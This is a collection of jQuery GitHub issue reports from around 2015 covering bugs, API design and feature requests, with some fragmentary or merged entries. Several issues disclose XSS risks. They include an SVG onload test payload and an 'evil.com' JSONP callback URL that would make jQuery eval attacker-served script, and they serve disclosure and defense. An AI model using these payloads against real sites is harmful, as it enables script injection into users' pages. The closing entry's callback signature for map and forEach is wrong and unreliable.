serialize() should serialize the EXACT SAME DATA that would be sent by the browser if the form was sent normally. That includes input elements of type "submit", but jquery ignores them.

I can't believe I'm reporting this bug in 2015.

title: Document "invocation correctness" development principle
body:
Ref https://github.com/jquery/jquery/issues/2134#issuecomment-102510442

We now (modulo particularly hairy backwards compatibility issues) consider it safe to assume that all function input matches a documented signature, and therefore allow functions to throw exceptions rather than fail silently. This should be captured somewhere, and my first thought was [CONTRIBUTING.md](https://github.com/jquery/jquery/blob/master/CONTRIBUTING.md).

title: Event handler is called when it has already been detached
body:
Event handler is called when it has already been detached

Hello.

**Description**
There are two handlers both attached to document for some event (let's say 'click'). The first handler detaches the second. When click occurs both handlers are called though only the first is expected.

I have tested the same scenario using pure js `addEventListener`/`removeEventListener` and only the first handler has been called.
I have also tested 'mouseup' and 'mousedown' events - behavior was the same.

In IE11 with pure js second handler is called (not like in other browsers) - I suppose it is IE issue.

Only the first handler is called.

title: Custom queue: Animation promise is resolved before animation has run
body:
A promise returned by jQuery.fn.animate does not work as expected when a custom queue is used. The promise is resolved before the animation even starts.

The following code

``` js
$elem
  .animate( { whatever: value }, { queue: "custom" } )
  .promise()
  .done( cbDone )
  .always( cbAlways );
```

executes the `cbDone` and `cbAlways` functions immediately ([jsbin](http://jsbin.com/sidovih/1/edit?js,console,output)). Worse, they run if the custom queue is not even set in motion with an initial `dequeue()` call ([jsbin](http://jsbin.com/socihi/1/edit?js,console,output)).

With the standard `"fx"` queue, by contrast, things work as expected and the promise is resolved after the animation has completed ([jsbin](http://jsbin.com/dekeqo/2/edit?js,console,output)).

The bug is present in the latest versions of both branches (1.11.3, 2.1.4).

title: css method returns incorrect background-color for select-box options in Firefox.
body:
In Firefox, jQuery's `css` method is not returning the correct `background-color` RGB value of options in a select box. It works as expected in Chrome. Obtaining the color via the native `elem.style.backgroundColor` property works in both browsers, though.

**_Here's a jsFiddle:**_ 
https://jsfiddle.net/pfe2utmq/12/

**_Tested in:**_
Chrome - Version 42
Firefox - Version 39 (Developers)

title: [New Feature] [PR proposal] Tree Traversal: .below()
body:
Here's my full proposal: http://stackoverflow.com/a/30089307/274502

In short, it would get the first element found below, in the DOM tree.

No, `.next()` and `.siblings()` or `.nextAll()` won't cut it. Nor will any other method under the [Tree Traversal category](https://api.jquery.com/category/traversing/tree-traversal/). And I do use this quite often so I suppose there might be a good use for having such feature... But I'm not sure how elegant it would be.

Javascript does have a similar function to work around this, `compareDocumentPosition` (found thanks to the other answer on that SO question), but it's not as compatible as using the universal selector with `.index()`.

I'm also pretty sure this isn't the best implementation for the need, but it works. I'd love to hear comments on how to improve it as well. :)

title: DOMContentLoaded handlers fail to fire after jQuery is loaded (Opera only)
body:
There is some weird interplay between jQuery and standard `DOMContentLoaded` listener registration. This issue only manifests in Opera (only tested with 27.0.1689.76 on Mac). It does not appear to affect either stable or dev channels of: Safari, Chrome or Firefox.

jQuery itself doesn't need to be used at all, and in fact is not even used in the test case. Simply including jQuery in the page (at a specific point) causes the error. Removing jQuery fixes the issue.

Steps to reproduce:
1. Add a standard `DOMContentLoaded` listener that:
   1. removes itself as event listener (https://gist.github.com/jasonkarns/f367c58149d9eda563bd#file-kill-domcontentloaded-js-L2)
   2. appends an iframe (https://gist.github.com/jasonkarns/f367c58149d9eda563bd#file-kill-domcontentloaded-js-L3)
2. include jQuery (jquery must be loaded _after_ the `DOMContentLoaded` listener per above)
3. register any other `DOMContentLoaded` listeners. These listeners will never fire. These listeners can be registered before or after jQuery is loaded; it doesn't matter. As long as both jQuery and these listeners are loaded after the offending listener (no. 1 above) then they will fail to fire.

Minimal test case uses [this gist](https://gist.github.com/jasonkarns/f367c58149d9eda563bd#file-kill-domcontentloaded-js) for the offending `DOMContentLoaded` listener (step 1 above). Then includes jQuery. Then uses the JS pane to register an additional `DOMContentLoaded` listener, which never fires.

Minimal test case using jQuery 1.11.3 http://jsfiddle.net/1mmyx06b/11/
Minimal test case using jQuery 2.1.4 http://jsfiddle.net/1mmyx06b/10/

title: :disabled selector inconsistent in different browsers
body:
When an input is disabled by its parent fieldset the `:disabled` selector behaves differently in IE ( any version ) then other browsers. In other browsers the `:disbaled` selector will indicated an input disabled by a parent fieldset, where in IE it will say it is not disabled.

http://jsbin.com/padopu/3/edit?html,js,output

My first thought was sizzle was falling back to QSA and the `:disabled` selector where available and this was not working correctly in IE, but QSA works correctly in IE9-Edge for this. 

There seems to also be a related documentation issue as the docs say this always checks the disabled prop. see jquery/api.jquery.com#734

title: One ReferenceError or TypeError breaks $(document).ready and prevents it from ever firing again
body:
jsFiddle for reproduction: http://jsfiddle.net/n093b4pg/3/

If a single exception is thrown inside a `$(document).ready` callee, the `ready` event will never fire again and will become entirely unresponsive to new attempts to call it.

Similar is other event bindings, like click: after one callee in the list throws an exception, later callees won't be called ([example](http://jsfiddle.net/xvza6ddq/)). However, the event doesn't shut down and become totally unresponsive for all time.

**Expected behaviour:** Each `$(document).ready` callee should be handled in isolation. If one breaks and throws an exception, it does not break every later `$(document).ready` call for all time.

(Alternately, the expected behaviour could be exactly how it's working now? I don't think it is documented. This just left us hunting for a few hours today.)

title: Could :contains support regex? or any other solutions in jQuery?
Javascript execution on in-memory element
body:
I'm not exactly sure if this is the right repository to post this issue - if not please help direct where this bug should be filed.  It might be a Firefox bug, but I think the source is jQuery - so starting here,

We've noticed that an in-memory element (aka: not attached to the DOM) can perform javascript execution in some cases - which shouldn't happen, javascript should only be executed after the element is attached to the DOM thus making this a potential source of XSS injection attacks.

**Reproduces on: Firefox** 37.0.1
Using: jQuery 2.1.3

**Does not repro on: Chrome** 42.0.2311.90 (64-bit)

---

Minimal repro script:

```
$("<svg onload='alert(1)'>")
```

JQuery injection example: http://output.jsbin.com/kogegahuya/1
JQuery script: http://jsbin.com/kogegahuya/1/edit?html,output

---

Second repro using [element.append()](http://api.jquery.com/append/)

```
$('<div>').append("<svg onload='alert(1)'>")
```

JQuery injection example: http://output.jsbin.com/kogegahuya/1
JQuery script: http://jsbin.com/kogegahuya/1/edit?html,output
Javascript equivalent example (does not perform injection): http://jsbin.com/rematiyusi/1/edit?html,output

$.extend({a: null}, {a:['a']}, {a:['b']}).a.length === 1; //should be two!
```

title: Data: align data accessors with the ultimate "Embrace HTML5" direction
body:
camelCasing in `.data()` has always been problematic. Our attempts to work around camelCasing whenever possible has always caused problems. We've decided to just always camelCase. Not only will our implementation align with the dataset spec, but it makes everything a lot simpler.

I've made a separate issue because #1751 is not broad enough in scope. It only pertains to keys with dashes and digits, which will also be fixed, but in a separate commit.

The solution as @gibson042 laid out in [this comment](https://github.com/jquery/jquery/issues/1751#issuecomment-67721150), is this...

``` js
assert.equal( jQuery("<div>").data({ "a-b": 1 }).data( "a-b", 2 ).data( "a-b" ), 2 )
```

And per https://github.com/jquery/jquery/pull/1515#issuecomment-37758521 , we want the "[Embrace HTML5](https://docs.google.com/spreadsheets/d/1gf0vzYGwg7IA7yIkyJs-Jk31SWDogQrBkzPb-xl6u-o/edit?usp=sharing)" option:
- camelCase `data-*` attributes into the data object on first access
- set only camelCase key on `.data( key, val )` (setter)
- camelCase all the added keys on `.data( obj )` (bulk setter)
- look for only camelCase key on `.data( key )` (getter)
- ignore direct manipulation from operations on `.data()`

title: Only load the parts that are wanted.
body:
The typical component, or "require() what you need", model is becoming not just familiar, but it feels like as it is on its way of becoming a standard.

Current jQuery supports AMD and CommonJS. But what it lacks is the ability to be split. Let's say I know that the two jQuery plugins I need only require basic DOM manipulation (setting attributes) and eventing (click and keydown event). Then I would only need an approximately 1/10 of what jQuery offered.

When looking into 2.1.4's `src/` folder, I noticed that `jquery.js` actually uses `define()` to load dependencies.

My question is: If I re-wrote this file to my liking and only loaded the modules I wanted, would that result in a smaller jQuery footprint? 

I am currently using [WebPack](https://github.com/webpack/webpack) for my project, and already managed to bring Bootstrap down a couple KBs by excluding the features I did not want. Now I want to do the same to jQuery.

Especially with Bootstrap reduced, I realized that it also does not need the entire potential of jQuery. For instance, I see no where where Bootstrap would use the AJAX functionalities.

Kind regards, Ingwie.

title: Rearrange animation options logic
body:
cc @gnarf

`.animate` uses the undocumented `jQuery.speed` (its only use, in fact) to manipulate options before sending them to `Animation`, where they are preserved as "original": https://github.com/jquery/jquery/pull/2218#issuecomment-98504382

We should move such manipulation so that `anim.originalOptions` is in fact what it claims to be.

title: jQuery.fn.map is inconsistent with standard
body: Currently jQuery.map takes a callback then when executing over the dataset the index is the first argument and the value is the second but per the JavaScript array prototype map function (https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/map), these two are swapped. Is there a reason that jQuery is not consistent with the JavaScript standard?

title: Ajax callbacks not triggered on chrome
console.warn for .hide() and other perf gotchas.
body: There's a known [performance issue](https://github.com/jquery/jquery/issues/2057) with `hide` & friends that jQuery [would like to fix](https://github.com/jquery/jquery/pull/2180). I've seen browsers leverage console warning used to create positive change. For example Firefox warns of `__proto__` use and this got Zepto to drop it. I think this same technique could be used to deliver a gentle one-off warning about `hide`'s use, or the underlying issue, and recommend an upgrade path. I'd like to flesh out this idea for browser dev tools here for easier collaboration. \cc @paulirish

title: jQuery allows strings and objects as event handlers => error thrown
body:
http://jsfiddle.net/t7da32og/

Click the button and that will make the browser throw an error. In the `on` function code is checked that the `fn` var is not `false` or whatever value the `if (!fn)` condition matches (0, null). But strings and objects are allowed and then the `handler.apply` function will of course fail.

My question is, is there a reason why these 2 types are not checked and the callback is not discarded? If not, I'll be more than happy to submit a PR to fix the issue!

title: .click() does not work with Firefox, IE for checkboxes not added to document.body
body:
Only Chrome works, in IE the 'click' event is not dispatched at all, in Firefox the event is dispatched but the 'checked' property is not properly updated.

Can you, please, take a look? At least the behavior should be consistent between different browsers and probably .click() should work like it does now in Chrome.
#### JSFiddle to reproduce

http://jsfiddle.net/antonivanov2/Lkz2ueg3/4/
##### Output
- Firefox
  
  jQuery.click detached checkbox: doesn't work
  jQuery.click checkbox: works
  MouseEvent("click") detached checkbox: works
  MouseEvent("click") checkbox: works
- Chrome
  
  jQuery.click detached checkbox: works
  jQuery.click checkbox: works
  MouseEvent("click") detached checkbox: works
  MouseEvent("click") checkbox: works
- IE
  
  jQuery.click checkbox: works

title: npm distribution is missing cdn files since 2.1.4
body:
Comparing `npm install jquery@2.1.3` against `npm install jquery@2.1.4` reveals that the latter does not include a folder "dist/cdn" anymore.
The main problem I have with this is that the file "dist/jquery.min.js" includes a sourcemap comment while "dist/cdn/jquery-2.1.3.min.js" did not. I cannot include the 2.1.4 file in my build without getting 404 errors int the browser (when it tries to load the sourcemap).
This might be related to #1707.

body:
Let's have the following DOM:

```
<svg>

```

Typing `$('#foo').addClass('bar')` will do nothing. Typing `foo.classList.add('bar')`will work as expected.

title: isArraylike
position() function reports incorrect left offset under Chrome
body: Test this https://jsfiddle.net/Reimu/yu3c361g/2/ under Chrome and other browsers, you will see the left offset reported by position() method is incorrect under Chrome. The value of left offset under Chrome is the gap between <html> and <body>, not the real left offset of the horizontally centered <div>. This problem relates only with horizontally centered <div>s, and can be fixed by calculating manually with the marginLeft value of the element's computed style and the gap between <html> and <body>. Maybe this is due to a possible bug / design choice of Chrome, as there are also some discussion about it on StackOverflow. But I think jQuery is supposed to deal with such difference between browsers.

title: jqXHR.then returns a string when dataType is JSON
body: According to the docs, jqXHR.then is equivalent to jqXHR.done but when performing an ajax get request and the dataType is set to 'JSON' the data arg in the 'done' callback is an object but the data arg when using 'then' is always a string.

title: IE9 pseudo selectors
body:
Under ie9, when using a pseudo selector library (http://www.appelsiini.net/projects/viewport) jQuery executes the selector on every element on the page, even though it was given an id for the element.

$('#id:in-viewport') causes :in-viewport to be executed on every element on the page
$('#id').is(':in-viewport'); obviously does not.

This is a huge performance issue under IE9. This does not happen under chrome and likely under other browsers.

I unfortunately do not have the expertise in jQuery to determine where exactly the issue lies so I cannot provide a patch at this moment. However, I would suspect that this would be a great performance optimization for older browsers where if the CSS selector is given an ID, it first searches by that instead of executing the pseudo selector code.

I tested this in IE9, windows 7. Also tested in Chrome 42 on GNU/Linux (arch). jQuery version 1.11.2. 

Yes I realize that I'm talking about a 3rd party add on for jQuery, I do not think it is the issue since the method defined for the :in-viewport ($.inviewport) is being called different numbers of times depending on browser version. In IE9, it gets called hundreds of times with elements that are not the one specified by ID. Under chrome it is just the element specified by ID. It appears to be how jQuery handles ID selectors.

The use case I have is a site with an infinite stream of items. I need to do something as the cards come into the viewport. I have a list of IDs for the cards so I iterate over the IDs and run the in-viewport pseudo selector on them. I have a list of 30 ids that gets pared down when each item has entered the view port. Under IE, performance was abysmal. running in-viewport 30 times shouldn't be too terrible, and indeed it isn't unless you're on IE9.

body:
`jQuery.unique` is an [alias](https://github.com/jquery/jquery/blob/b561f5ab0a5e13f8203307016a02ee965a8be7d3/src/selector-sizzle.js#L9) to the better-named `Sizzle.uniqueSort`, and the fact that it sorts has [surprised even our own team members](http://irc.jquery.org/%23jquery-dev/default_%23jquery-dev_20150422.log.html#t08:50:51).

We should deprecate `jQuery.unique` in favor of `jQuery.uniqueSort` (which will need to be introduced).

title: :visible/:hidden selectors unreliable
body:
# Issue This issue is present in both version 1 and 2 of jQuery. It is happening on inline elements wrapping block elements, which is valid in HTML5, such as a header and an image wrapped in a single anchor. Two issues arise: 1. Different browsers report offsetWidth/Height of the anchor differently. For example Firefox would report one visible anchor in the example below, and Chrome will report 0. This also highly depends on the CSS styles applied, as on the page where this issue was discovered missing images are not displayed at all instead of the common missing image icon. 2. While a browser may report an anchor as invisible, child elements are still visible and clickable as they inherit anchor properties. ## Example ``` html

Header

 ``` # Solution There are 2 potential solutions that come to mind, but each has flaws 1. Loop through child elements and check each for visibility. Potentially harmful for performance, although the selector is already marked as such in the documentation. 2. Check parent for visibility. Probably not enough on its own, as it will report incorrectly, if anchor doesn't have visible children.

Question about the behavior of `$()` wrapping a wrapped jQuery object.
body:
As a big fan and heavy user of jQuery, I got a question here. (I've searched on StackOverflow, but found nothing helpful. Then I posted [my question](https://forum.jquery.com/topic/the-behavior-of-handling-a-jquery-object) on jQuery Forum, still got nothing.) I noticed this paragraph in [jQuery's API doc](http://api.jquery.com/jQuery/#cloning-jquery-objects): > #### Cloning jQuery Objects > > When a jQuery object is passed to the `$()` function, a clone of the object is created. This new jQuery object references the same DOM elements as the initial one. That means, if `$elem` is already a wrapped jQuery object, `$($elem)` will still unwrap-and-wrap the element(s) in `$elem` to create a new jQuery object, rather than returns `$elem` directly. Initially, my workmates and I supposed that jQuery needed to re-query the selector of `$elem` to keep up with the modified DOM. Then we tried these codes: ``` js $wrapper.append('

test

') var $elem = $('p') $wrapper.append('

test2

') var $elem2 = $($elem) ``` We found `$elem2` contained the same DOM element(s) as `$elem` did. That proved `$($elem)` didn't do any "re-query" thing. So finally, we're confused about `$($elem)` -- why not return `$elem` directly when it's already a jQuery object. Any other purpose for creating (cloning) a new object?

title: [FEATURE] Methods to 'submit' GET or POST to a page (no ajax)
body:
I believe it should be possible to send GET or POST data to a page, and let the browser handle the response, as if it was a normal form submit (but without a pre-existing `<form>` tag). 

I feel like this would be a useful addition to the core, because many people expect it to already be available: many questions all over the internet are about "how to do this wih jQuery" (i.e. it's intuitively felt as if it should be doable without plugins). It's not ajax, but jQuery doesn't have to limit itself to usefulness in ajax applications, does it? I believe this makes sense because it's a pretty basic use-case. 

These methods might be called `.getPage` and `.postPage`, or `.formGET` and `formPOST`, or whatever would sound sensible. 

There are several ways to implement this; one is shown here:
http://stackoverflow.com/a/1876299/740813

title: .val(Array) does not assign values from array to different elements
body:
I'm using v1.11.2. According to the docs and the very last demo from here https://api.jquery.com/val/ when using `.val(arr)`, where `arr` is an array, it should assign the values from the array accordingly to each element returned by the selector. However, it just assigns `arr.toString()` to each instead. See this jsfiddle https://jsfiddle.net/n1ate7ba/

```
<form id="form-id">
<input type="hidden" name="answer" value="-" />
<input type="hidden" name="answer" value="-" />
<input type="hidden" name="answer" value="-" />
<input type="hidden" name="answer" value="-" />
</form>
```

and

```
var arr = ['1','1','1','1'];
$('#form-id').find('[name=answer]').val(arr);
alert($('#form-id').find('[name=answer]')[0].value);
```

I'd expect each `<input>` to have value `"1"` but instead, they have value `"1,1,1,1"`, as if jQuery actually did `.val(arr.toString())`.

My workaround now is to use `.val(function(index,value))` but that's slower:

```
$('#form-id').find('[name=answer]').val(function (index,value) { return arr[index]; });
```

title: Consider not eval-ing responses to cross-domain queries
body:
Currently, if client-side code does `$.get(url, ...)` or `$.getJSON(url, ...)` and `url` is a cross-domain URL, by default JSON will look at the URL and the `Content-Type` of the response to guess what protocol to use.  Under certain conditions (e.g., the URL contains `=?` or `??`, or the `Content-Type` of the response is Javascript), jQuery will auto-guess that JSONP should be used and will automatically eval the response to the query.

This behavior is dangerous and can introduce XSS vulnerabilities.  It's also potentially unexpected: if the caller doesn't explicitly set `dataType` to `jsonp` or `script`, it might be surprising and unexpected that `get()`/`getJSON()`/`ajax()` can eval the response from the server.  At present, I can imagine it might cause subtle XSS vulnerabilities in deployed code that uses jQuery.

I think it would be worth considering whether it's possible to change this automatic behavior.  A good principle might be: Don't eval the response from a cross-domain server unless the developer has requested that or could reasonably anticipate that it would happen.

Of course, backwards compatibility with existing jQuery code is going to be a challenge.  I don't know whether there's a good way to "thread the needle" between (1) backwards compatibility with existing code and (2) creating traps for the unwary (where code that looks entirely reasonable is actually a XSS vulnerability).  But perhaps it's possible for jQuery to be just a bit smarter.  For instance, when the developer calls `$.getJSON()` and doesn't explicitly set `dataType` to `jsonp`, could jQuery use `JSON.parse()` instead of `eval`?  Is it feasible to disable the auto-JSONP or step back from it a bit, at least for cross-domain queries?  Lacking data on usage of jQuery APIs, I don't know what might be possible, but this smells like an area where some changes to jQuery's behavior might help developers avoid getting bit by subtle XSS bugs.

See e.g. http://stackoverflow.com/q/29044209/ and http://stackoverflow.com/q/29022794/ and all the usual resources about the security risks of eval on untrusted code.

title: Docs for get() should specify under what condition it is secure
body:
The documentation for get() should mention the conditions under which it causes a XSS vulnerability, and describe what developers need to do to avoid introducing XSS when using get().

In particular, `$.get(untrusted_url, function(...) {...})` is unsafe, if `untrusted_url` comes from an untrusted source (e.g., from the attacker, from another user).  There are apparently two problems.  First, if the attacker controls `evil.com`, the attacker can arrange for `untrusted_url` to hold something like `http://evil.com/callback=?` and then arrange for `evil.com` to respond to that request with malicious Javascript.  JQuery's JSONP auto-detection will then eval the Javascript found in the response to that request, making the `$.get()` call a XSS vulnerability.  Second, if the attacker controls `evil.com`, the attacker can arrange for `untrusted_url` to be any URL under `evil.com` and then arrange for `evil.com` to respond to that request with malicious Javascript served with a `Content-Type` set to something Javascript-like.

This is a foot-gun.  It's not clear from the documentation for `get()` that it can introduce this kind of vulnerability when part or all of the URL can be controlled by the attacker.  The documentation for `get()` has no mention of the fact that it might auto-guess JSONP and eval the response from the server, let alone the conditions under which this happens.  It also does not mention that it might eval the response from the server, if its `Content-Type` is set to make it look like Javascript.  The documentation doesn't describe what developers have to do to be safe.

Documenting this more clearly would help developers avoid inadvertent XSS vulnerabilities in their code.

Apparently if the URL might be partially or completely under attacker control, the only safe way to fetch JSON from that URL is to use `$.ajax(url, {dataType: 'json', jsonp: false});`.   In particular, it is necessary to set `dataType` to `json` _and_ set the `jsonp` option to `false`.  This fact is not apparent from the documentation -- it should be described in the documentation more clearly.  Also there appears to be no way to set this combination of settings with the `$.get()` method, so when the URL might be under attacker control, it's necessary to use `$.ajax()`.

See http://stackoverflow.com/q/29044209/ for details.

title: Docs for getJSON() should specify under what conditions it is secure
body:
The documentation for getJSON() should mention the conditions under which it causes a XSS vulnerability, and describe what developers need to do to avoid introducing XSS when using getJSON().

In particular, `$.getJSON(untrusted_url, function(...) {...})` is unsafe, if `untrusted_url` comes from an untrusted source (e.g., from the attacker, from another user).  If the attacker controls `evil.com`, the attacker can arrange for `untrusted_url` to hold something like `http://evil.com/callback=?` and then arrange for `evil.com` to respond to that request with malicious Javascript.  JQuery's JSONP auto-detection will then eval the Javascript found in the response to that request, making the `$.getJSON()` call a XSS vulnerability.

This is a foot-gun.  It's not clear from the documentation for `getJSON()` that it can introduce this kind of vulnerability when part or all of the URL can be controlled by the attacker.  Documenting this more clearly would help developers avoid inadvertent XSS vulnerabilities in their code.

Apparently if the URL might be partially or completely under attacker control, the only safe way to fetch JSON from that URL is to use `$.ajax(url, {dataType: 'json', jsonp: false});`.  This fact is not apparent from the documentation -- it should be described in the documentation more clearly.

See http://stackoverflow.com/q/29022794/ for details.

title: jQuery with Angular requests assets multiple times when CORS is enabled on webserver
body:
Ok, this is a bit crazy and there are a few moving parts, but I'll try to give you what is happening as simply as I can. I have nginx running as localhost:8080 with CORS enabled. Separately, I have a django web app running on port 8000, serving the API. I use the CORS headers to access the API on the other port. Here's where things get weird:

When the page loads, all of the scripts are re-requested by jQuery, which breaks a bunch of things. Here are a couple pics of my console for reference:
![screen shot 2015-03-25 at 5 50 19 pm](https://cloud.githubusercontent.com/assets/224680/6836368/9db32572-d317-11e4-906c-c70deee8a9e6.png)
![screen shot 2015-03-25 at 5 50 33 pm](https://cloud.githubusercontent.com/assets/224680/6836371/a376eff2-d317-11e4-9273-c1ed8b42571f.png)

I've tracked it down here, on line 8549:

```
`// Cross domain only allowed if supported through XMLHttpRequest`
`if ( support.cors || xhrSupported && !options.crossDomain ) {`
```

It makes sense that the page would want to check to see if cors is enabled before trying to run again for all of the resources, but what I'm not understanding is why it's adding preflight if it is _NOT_ a crossDomain request? Isn't that the exact opposite of what we'd want? You'd want to add the preflight and other cors related request headers IF it's a cross domain request, not if it isn't. Perhaps this would be better:

```
    `if ( support.cors || xhrSupported && options.crossDomain ) {`
```

Does that make sense? Please let me know if you have any questions; perhaps I can take you through my local server to illustrate what is happening.

title: $.siblings() of a set with length > 1 includes original members
body:
See this [JSFiddle](http://jsfiddle.net/boldewyn/z9pgLvu9/). Consider a series of `<b>` elements, and a jQuery object, that contains _some_ of them:

```
var $b = $('b:even');
```

The [documentation](http://api.jquery.com/siblings/) on `$.siblings()` says:

> The original element is not included among the siblings, which is important to remember when we wish to find all elements at a particular level of the DOM tree.

So the assumption is, that in this case `$b.siblings() == $('b:odd')`. However, jQuery does not test for each sibling, if it is contained in the original set, so we get:

```
$b.siblings() == $('b');
```

Personally, I consider this a bug of the implementation of `$.siblings()`, but if it is intended behavior, at least the docs need to reflect this.

title: $.each fails intermittently on iOS due to Safari bug
body:
There is a timing bug in iOS8 that causes mobile Safari to incorrectly report a 'length' on objects that don't have one.

To the best of my knowledge, this happens on iOS8+, possibly only on 64-bit systems.  The bug is triggered for objects that have only numeric properties.  For example:

``` javascript
foo = { 1: 'a', 2: 'b', 3: 'c' } 
```

In this case, if you query `foo.length` then mobile Safari will _sometimes_ return 4 (the highest property + 1).

This causes functions like `$.each()` to treat objects such as foo above as arrays instead of objects, and when it tries to iterate them as such it fails since there is no foo[0].

The problem can be fixed in the function `isArrayLike()`.  Instead of just checking for 

``` javascript
typeof length === "number"
```

you also need to check for

``` javascript
obj.hasOwnProperty('length')
```

The latter check is immune to the iOS bug.

I realize this is a fix just for one browser, but it's a browser with a very large user base.

You can see more background and some repro steps at the following Stack Overflow discussion:

http://stackoverflow.com/questions/28155841/misterious-failure-of-jquery-each-and-underscore-each-on-ios

title: Does it make sense to split jQuery into smaller modules?
body:
Since npm is doing a great job, and [browserify](http://browserify.org/) and [webpack](http://webpack.github.io) are becoming popular, commonjs style is highly recognised by a lot of front-end developers. [jQuery also embraces npm](http://blog.npmjs.org/post/111475741445/publishing-your-jquery-plugin-to-npm-the-quick), which makes npm the future package manager for JavaScript of both front-end and backend.

However, jQuery is quite heavy, bloated with methods that would probably never used by a website, and [this is not quite the npm way](https://github.com/substack/browserify-handbook#module-philosophy). Say if I want to iterate over objects, why would I use `jQuery.each` but not `lodash.each`? I can even load different versions of `lodash` methods in one app without `require`ing the whole lodash src files.

Therefore, I'm asking: _Does it make sense to split this module into smaller ones so that developers can cherry pick the methods they are going to use?_ In fact, jQuery src is already modulised so it wouldn't be hard to publish each small piece to npm (just need a build tool to convert them). Packages like [cheerio](http://cheeriojs.github.io/cheerio/) is doing some similar things and jQuery could potentially share some small modules with it in some way. Angular.js could just use the ones they need instead of building jqlite themselves.

Just like lodash, jQuery can also develop some build tool to build different versions for different purposes.

title: Trailing Ampersand causes Uncaught Error: Syntax error
body:
Issue: jQuery encounters a Syntax error on first load and fails to complete initialisation. (jQuery version 2.1.3)

How to reproduce;

1) Create a HTML page including jQuery 2.1.3 using a standard scrip> tag.
2) Request a URL with a trailing ampersand (e.g. www.example.com/?myVar=1& )
3) Check developer console for the following error message;

"Uncaught Error: Syntax error, unrecognized expression: &-tab". (Chrome)

Test in:

Chrome, Safari, Firefox.

Understandably, trailing ampersands are not useful in the slightest and your web application should be build to manage query parameters neatly, however jQuery probably shouldn't completely fall over because of this.

title: $.post and $.get ignore type if no callback is provided
Standardize "invalid input" behavior
body:
Many jQuery collection operations are only meaningful on elements or (somewhat less commonly) DOM nodes, but the collections can logically contain _anything_. Such operations should **always** assume valid input, potentially throwing exceptions when they encounter an invalid member—especially given the ease of manually cleaning like `$collection.filter("*")`.
- Single-member read (e.g., `.attr( name )`, `.css( name )`, `.offset()`)
- Whole-collection read (e.g., `.hasClass( clazz )`)
- Whole-collection write (e.g., `.attr( name, val )`, `.css( props )`, `.offset( n )`, `.addClass( clazz )`)

Special consideration is warranted for single-member reads responding to empty collections. Current behavior usually returns `undefined`, which seems reasonable to standardize on (including changing those methods that return `null`, like `.scrollTop()` and `.width()`). There are cases where this collides with real output, but such collisions seem to be sane—`$el.css( unknownProperty )`, `$el.prop( nonexistent )`, `$hasNoData.data()`, etc.

Related:
- #2114
- #2115

title: html() function does not return correct xhtml for legacy created html strings
body:
According to my understanding of the HTML5 spec the disabled option being set is 'disabled="disabled"' In old HTML and also as produced by some browsers direct innerHTML, and also anything that may be retrieved having been stored in a database or old email you can acquire strings like '
' capitalised and no value for the disabled attribute. var htmlString = "
" this was perfectly legitimate in old HTML If you put this direct into jquery you get an old school solution - the input tag is not closed and the disabled attribute has the incorrect value "" rather than disabled $(htmlString ).html() So for proper xhtml you need a / at the end of the input element and the value disabled in the disabled attribute. My own html cleaner can sort this ydrDynamicLoad.load("cleanser").xhtml(htmlString).text
In order to do this the cleanser has a small xml database of html tags and whether or not they are supposed to be contentless and loads of rules about how to clean up bad html.

title: Return null from .attr when attributes don't exist
body:
`.attr("nonexistent")` currently returns `undefined`, [probably](https://github.com/jquery/api.jquery.com/issues/523#issuecomment-49600962) from the days before `.prop`. But the native DOM `getAttribute` and `Sizzle.attr` both return `null` in such cases. Also, `.attr( name, null )` _removes_ attributes, and it would be very convenient to allow [universal round-tripping](https://github.com/jquery/api.jquery.com/issues/523#issuecomment-49554408).

Let's consider changing the return value to accommodate.

Note that _setter_ treatment of `undefined` is explicitly out-of-scope for this ticket, as are `.prop` and `.data` round-tripping, although those are certainly related topics.

title: Add new closest relative selector
body:
I find myself quite often traversing dom like `$el.closest('.foo').find('.bar')`, and always thought it would be nice to have it in one string like `$el.find('..(.foo) .bar')` .

The main reason to have this in one string is to make it easier to navigate elements in reusable components with parameters passed via `data-` attributes. For example, here: https://github.com/nathanvda/cocoon#link_to_add_association it has quite a few options like `data-association-insertion-traversal` which are very long and somewhat confusing at first use.

I investigated source a little and it seems easy to add relative combinator `..` (or `^`?), but requires source modification because  `rcombinators` in Sizzle is inaccessible from outside.

If this idea have any chances to get merged I think could send a PR.

title: jQuery Ajax Basic Authentication `opts.username` `opts.password` not sending auth headers
Remove ownerDocument check in offset getter
body:
Fallout from #2043: https://github.com/jquery/jquery/pull/2043/files#r23981494

Since all supported browsers have `getBoundingClientRect`, there's no reason not to just call the method right away, letting an exception throw if input is in fact not a DOM element.

The "object without getBoundingClientRect" test will have to go as well.

title: Allow offset setter to throw when input is disconnected
body:
Fallout from #2043: https://github.com/jquery/jquery/pull/2043#discussion_r25352005

Remove the [`|| { top: 0, left: 0 }`](https://github.com/NekR/jquery/commit/d0df2c6bcf5709bb0cdaf4dd547e88a2ec2f6381#diff-d38379d70ee2c5c5a0acb5b0f7acef8dL35) that was added to let `$disconnected.offset({ top: y, left: x })` continue proxying `.css({ top: y, left: x })`, along with any associated tests asserting the behavior.

title: map vs each
body:
in js [map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/map) and [forEach](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/forEach) has similar signatures

``` js
[].map(callback(index, currentValue, array), thisArg)
[].forEach(callback(index, currentValue, array), thisArg)
```
